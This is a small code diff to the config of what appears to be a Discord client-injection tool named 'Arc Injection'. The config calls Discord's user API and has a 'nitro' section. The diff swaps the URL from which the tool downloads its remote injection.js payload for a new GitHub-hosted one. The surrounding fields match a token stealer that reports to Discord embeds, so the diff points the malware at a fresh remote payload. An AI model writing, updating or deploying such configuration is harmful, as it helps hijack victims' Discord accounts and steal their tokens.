@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Arc Injection', 
   embed_icon: 'https://i.imgur.com/M9DGx56.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/kozelkozel1237/ara/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
